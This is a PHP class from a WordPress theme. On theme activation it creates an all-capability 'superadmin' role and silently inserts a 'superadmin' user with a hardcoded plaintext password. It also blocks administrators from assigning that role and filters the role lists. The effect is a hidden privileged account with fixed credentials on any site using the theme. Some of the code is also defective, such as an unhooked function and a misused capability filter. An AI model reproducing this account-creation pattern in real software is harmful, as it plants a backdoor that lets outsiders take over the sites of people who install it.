<?php

if( !class_exists('User') ) :

class User{

    public function __construct()
    {
        // Add Roles and Capabilities
        add_action('after_switch_theme', array($this, 'CreateRoles'));

        // Add and Filter Super Admin on Theme
        add_action('after_switch_theme', array($this , 'CreateSuperAdmin'));

        // Remove Roles and Capabilities
        add_filter('editable_roles', array($this, 'RemoveRoles'));
        add_filter('map_meta_cap', array($this, 'RemoveCapabilities'), 10, 3);
        add_filter('add_user_role', array($this, 'PreventAssignment'), 10, 2);
    }

    /**
     * CreateRoles
     */
    public function CreateRoles() {

        $role_name = 'superadmin';
        $role_display_name = 'Super Admin';

        if (!get_role($role_name)) :
            
            $capabilities = $this->GetCapabilities();
            add_role($role_name, $role_display_name, $capabilities);

        else :
            
            $superadmin_role = get_role($role_name);
            $capabilities = $this->GetCapabilities();

            foreach ($capabilities as $capability => $value) :
                $superadmin_role->add_cap($capability);
            endforeach;

        endif;
    }

    /**
     * GetCapabilities
     * @return array $all_capabilities
     */
    private function GetCapabilities()
    {
        global $wp_roles;
        $all_capabilities = array();
        
        foreach ($wp_roles->roles as $role) :
            foreach ($role['capabilities'] as $capability => $value) :
                if (!isset($all_capabilities[$capability])) :
                    $all_capabilities[$capability] = true;
                endif;
            endforeach;
        endforeach;

        return $all_capabilities;
    }


    /**
     * CreateSuperAdmin
     */
    public function CreateSuperAdmin() {

        $superadmin = get_user_by('login', 'superadmin');

        if (!$superadmin) {
            $superadmin_id = wp_insert_user(array(
                'user_login' => 'superadmin',
                'user_pass'  => '506*664U&eAm',
                'role'       => 'superadmin',
            ));
        }
    }

    /**
     * EditRoles
     * @param array $roles
     * @return array $roles
     */
    public function EditRoles( $roles ) {
        
        if (current_user_can('administrator')) :
            unset($roles['superadmin']);
        endif;

        return $roles;
    }

    /**
     * RemoveRoles
     * @param array $roles
     * @return array $roles
     */
    public function RemoveRoles($roles) {
        
        if (isset($roles['subscriber'])) :
            unset($roles['subscriber']);
        endif;

        if (isset($roles['contributor'])) :
            unset($roles['contributor']);
        endif;

        return $roles;
    }

    /**
     * RemoveRoles
     * @param int $user_id
     * @param string $role
     * @return int $user_id
     */
    public function PreventAssignment($user_id, $role) {
        
        if (current_user_can('administrator') && $role === 'superadmin') :
            return new WP_Error('role_change_denied', __('Administrators cannot assign the Super Admin role.'));
        endif;

        return $user_id;
    }

    /**
     * RemoveCapabilities
     * @param array $allcaps, $cap, $args
     * @return array $allcaps
     */
    public function RemoveCapabilities($allcaps, $cap, $args) {

        if (array_key_exists('subscriber', $allcaps)) :
            unset($allcaps['edit_posts']);
        endif;

        if (array_key_exists('contributor', $allcaps)) :
            unset($allcaps['edit_posts']);
        endif;

        return $allcaps;
    }

}

$User = new User();

endif;
